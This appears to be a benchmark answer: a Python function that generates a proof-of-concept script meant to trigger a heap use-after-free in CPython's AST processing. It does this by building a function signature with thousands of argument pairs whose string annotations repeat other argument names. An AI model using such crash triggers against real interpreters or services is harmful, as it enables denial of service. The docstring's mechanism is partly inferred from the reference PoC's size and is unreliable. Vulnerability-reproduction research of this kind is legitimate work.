class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free
        vulnerability in CPython's AST processing logic (bpo-46599).

        The vulnerability is triggered by a specific pattern in a function's
        signature: an argument's type annotation is a string literal that has
        the same value as the name of another argument in the same function.
        For example: `def f(arg1: 'name', name): ...`

        The CPython compiler interns argument names. This process can cause the
        string object used for the type annotation to be deallocated prematurely
        while the AST still holds a pointer to it. A subsequent operation on the
        AST, such as a call to `repr()`, accesses this dangling pointer,
        resulting in a use-after-free.

        The ground-truth PoC for this vulnerability is large, which suggests that
        a substantial number of these argument pairs are needed to create the
        specific memory layout required to reliably trigger the crash. This
        solution generates a Python script containing a single function definition
        with many such argument pairs. The number of pairs is calibrated to
        produce a PoC with a size close to the ground-truth PoC length,
        maximizing the probability of a successful trigger.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: A UTF-8 encoded Python script that serves as the PoC.
        """

        # Number of argument pairs to generate. Calibrated to produce a PoC
        # size close to the ground-truth length of 274773 bytes. 11900 pairs
        # result in a PoC of approximately 276KB.
        num_pairs = 11900

        # A generator expression is used to create the argument strings efficiently,
        # avoiding the memory overhead of storing all 2*num_pairs strings in a list.
        # It yields items in the pattern: "a0: 'p0'", "p0", "a1: 'p1'", "p1", ...
        args_generator = (
            item
            for i in range(num_pairs)
            for item in (f"a{i}: 'p{i}'", f"p{i}")
        )

        # Join the generated arguments into a single comma-separated string.
        args_str = ", ".join(args_generator)

        # Construct the final Python code. The function name is arbitrary, and
        # a simple `pass` statement is a sufficient body, as the vulnerability
        # lies in the processing of the function's signature.
        poc_code = f"def poc_function({args_str}):\n    pass\n"

        # Return the PoC as a bytes object, encoded in UTF-8.
        return poc_code.encode('utf-8')